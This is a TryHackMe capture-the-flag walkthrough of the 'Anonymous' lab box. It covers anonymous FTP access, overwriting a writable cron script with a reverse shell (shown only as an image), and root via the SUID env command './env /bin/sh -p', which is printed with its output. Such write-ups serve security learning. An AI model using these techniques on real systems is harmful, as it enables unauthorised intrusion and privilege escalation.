# THM - Anonymous

#### Ip: 10.10.2.68
#### Name: Anonymous
#### Rating: Medium

----------------------------------------------------------------------

anonymous.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `-sC` and `-sV` flags to use basic scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/THM/Anonymous]
└─$ sudo nmap -p-  --min-rate 10000 10.10.2.68 -sC -sV                    
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 12:46 CDT
Warning: 10.10.2.68 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.2.68
Host is up (0.28s latency).
Not shown: 63512 closed tcp ports (reset), 2019 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.6.181
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-09-27T17:47:24
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-09-27T17:47:24+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.28 seconds
```

The first things that jump out at me here are that there is anonymous access to the FTP server enabled, and also that there are open HTTP ports.

Lets check out FTP first.

Looks like there are 3 files in a directory called `scripts`, lets bring these back for examination using `mget *`:

```text
┌──(ryan㉿kali)-[~/THM/Anonymous]
└─$ ftp 10.10.2.68                           
Connected to 10.10.2.68.
220 NamelessOne's FTP Server!
Name (10.10.2.68:ryan): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||57356|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||46328|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          989 Sep 27 17:49 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> mget *
mget clean.sh [anpqy?]? y
229 Entering Extended Passive Mode (|||36906|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |********************************************************************************|   314        2.99 MiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (1.46 KiB/s)
mget removed_files.log [anpqy?]? y
229 Entering Extended Passive Mode (|||16050|)
150 Opening BINARY mode data connection for removed_files.log (989 bytes).
100% |********************************************************************************|   989        6.33 MiB/s    00:00 ETA
226 Transfer complete.
989 bytes received in 00:00 (3.17 KiB/s)
mget to_do.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||32003|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |********************************************************************************|    68        1.04 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.16 KiB/s)
ftp> bye
221 Goodbye.
```

Looking at the files:

```text
┌──(ryan㉿kali)-[~/THM/Anonymous]
└─$ cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
                                                                                                                             
┌──(ryan㉿kali)-[~/THM/Anonymous]
└─$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

Looks like the cleanup script may be running as a cronjob?

Lets look at the script itself:

cleanup.png

Yeah looks like the script simply removes files and if there is nothing to remove echoes "nothing to delete" to the log file.

### Exploitation

Lets try modifying the cleanup.sh script to execute a reverse shell when run. We can add a reverse shell one-liner to the end of the script:

shell.png

Saving the file and logging back into FTP we can usee the `put` command to overwrite cleanup.sh with our reverse shell:

put.png

Nice, that worked! 

Now that we are on the box we can grab the user.txt flag:

user_flag.png

### Privilege Escalation

Lets go ahead and transfer over LinPEAS to help enumerate a privilege escalation vector:

transfer.png

LinPEAS find that `/usr/bin/env` has the SUID bit set. 

env.png

Lets head over to https://gtfobins.github.io/gtfobins/env/ for the command we'll need.

gtfo.png

Lets give it a shot:

```text
namelessone@anonymous:/tmp$ cd /usr/bin
namelessone@anonymous:/usr/bin$ ./env /bin/sh -p
# whoami
root
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Nice! All we need to do now is grab the root.txt flag:

root_flag.png

Thanks for following along!

-Ryan

-------------------------------------------------------------

